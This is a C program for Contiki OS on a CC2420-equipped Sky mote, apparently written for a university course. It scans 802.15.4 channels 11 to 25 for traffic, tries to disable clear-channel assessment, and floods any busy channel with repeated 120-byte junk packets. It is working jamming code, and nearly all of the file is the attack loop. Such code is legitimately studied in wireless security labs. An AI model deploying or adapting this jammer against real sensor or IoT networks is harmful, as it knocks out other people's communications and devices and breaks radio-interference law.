
/**
 * \file
 *         Program for jamming a specific channel
 * \author
 *         Malthe Tøttrup <201907882@post.au.dk>
 * 
 *         $ make TARGET=sky distclean 
 *         $ make TARGET=sky MOTES=/dev/ttyUSB0 jammer.upload login
 */

#include "contiki.h"
#include <stdio.h> /* For printf() */
#include <math.h>
#include <os/dev/radio.h>  
#include "net/nullnet/nullnet.h"
#include "net/netstack.h"
#include <stdbool.h>
#include <string.h>
#include "sys/log.h"
#include "cc2420.h"
#include "dev/watchdog.h"
#include "sys/energest.h"

#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO
#define CLOCK_MS CLOCK_SECOND/1000
#define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
#define JAMMER_PACKET_LEN 120


static int current_channel = 11;

typedef struct{
     char data[JAMMER_PACKET_LEN];
}jpacket_t;

/*---------------------------------------------------------------------------*/
PROCESS(jammer, "jammer process");
AUTOSTART_PROCESSES(&jammer);
/*---------------------------------------------------------------------------*/
bool check_channel_activity(){
    int channel_activity = 0;
    for (int i = 0; i < 10000; i++){
        NETSTACK_RADIO.on();
        channel_activity += NETSTACK_RADIO.channel_clear();     //returns 0 if channel is busy and 1 if its clear
        NETSTACK_RADIO.off();
    }
    printf("channel activity result: %d \n", channel_activity);

    if(channel_activity != 10000){
        printf("Activity found on channel %d! \n", current_channel);
        return true; 
    }
    else {
        printf("No activity found on channel %d. \n", current_channel);
        return false;
    }
}

PROCESS_THREAD(jammer, ev, data)
{   
    PROCESS_BEGIN();
    printf("Starting jamming attack %d \n", (11 << 1));
    
    // NETSTACK_RADIO.on();

    //Hopefully this turns CCA off...
    NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 65);
    
    
    cc2420_set_channel(current_channel);
    jpacket_t jpacket;
    memset(&jpacket, 0, sizeof(jpacket_t));
    static struct etimer et;
    etimer_set(&et, CLOCK_SECOND/10);
    strcpy(jpacket.data, "Antonio Gonga is taking down your network.");

    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
    while(1) {
        
        // Check if current_channel is active
        // If not active, we go to next channel and try again
        watchdog_stop();
        if (!check_channel_activity())
        {   
            // Cycle to next current_channel
            // current_channel = (current_channel >= 26) ? 11 : current_channel++;
            if (current_channel >= 25) {
                current_channel = 11;
            } else {
                current_channel++;
            }
            cc2420_set_channel(current_channel);
            // Start loop again
            continue;
        }

        //When activity is found we start the jamming
        
        for (int i = 0; i < 10000; i++)
        {
            NETSTACK_RADIO.on();
            cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
            NETSTACK_RADIO.off();
        }
        watchdog_start();

        
    }

    PROCESS_END();
}
/*---------------------------------------------------------------------------*/
